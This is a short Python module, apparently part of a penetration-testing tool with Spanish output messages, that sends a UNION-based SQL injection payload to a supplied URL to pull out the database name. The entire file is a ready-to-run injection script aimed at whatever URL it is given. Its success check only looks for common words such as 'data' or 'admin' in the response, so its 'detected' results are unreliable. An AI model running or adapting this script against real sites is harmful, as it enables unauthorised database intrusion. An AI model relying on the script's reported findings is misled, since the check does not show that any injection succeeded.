# modules/injector.py

import requests
import urllib.parse

HEADERS = {
    "User-Agent": "Mozilla/5.0 (PentestingBot)"
}

def extract_database_name(url):
    try:
        payload = "' UNION SELECT database(), null-- -"
        full_url = url + urllib.parse.quote(payload)
        response = requests.get(full_url, headers=HEADERS, timeout=10)

        if response.status_code == 200:
            # Buscamos si devuelve el nombre de la base
            texto = response.text.lower()
            posibles = ["information_schema", "mysql", "db", "data", "admin"]
            for p in posibles:
                if p in texto:
                    return f"✅ Base de datos activa detectada: `{p}`"
            return "⚠️ La petición fue enviada pero no se pudo extraer la base de datos."
        else:
            return f"❗ Respuesta inesperada: {response.status_code}"

    except Exception as e:
        return f"❌ Error al intentar inyectar: {str(e)}"
